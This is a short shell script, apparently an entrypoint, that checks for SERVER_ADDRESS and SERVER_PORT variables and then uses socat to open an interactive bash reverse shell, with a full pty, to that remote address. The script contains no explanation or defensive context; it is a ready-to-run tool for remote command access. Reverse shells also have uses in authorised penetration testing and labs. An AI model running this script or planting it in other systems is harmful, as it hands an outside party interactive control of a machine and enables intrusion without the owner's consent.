#!/bin/ash

# Check for required env variables
error="false"
[[ -z ${SERVER_ADDRESS} ]] && echo "SERVER_ADDRESS variable not set." && error="true"
[[ -z ${SERVER_PORT} ]] && echo "SERVER_PORT variable not set." && error="true"
# Exit if error encountered
[[ "${error}" == "true" ]] && echo "Error encountered. Exiting" && exit 1

# Invoke reverse shell, using bash for better tty experience
echo "Invoking reverse shell with socat to dest ${SERVER_ADDRESS}:${SERVER_PORT}"
socat EXEC:'/bin/bash --noprofile --norc -i',pty,stderr,setsid,sigint,sane,raw tcp:${SERVER_ADDRESS}:${SERVER_PORT}
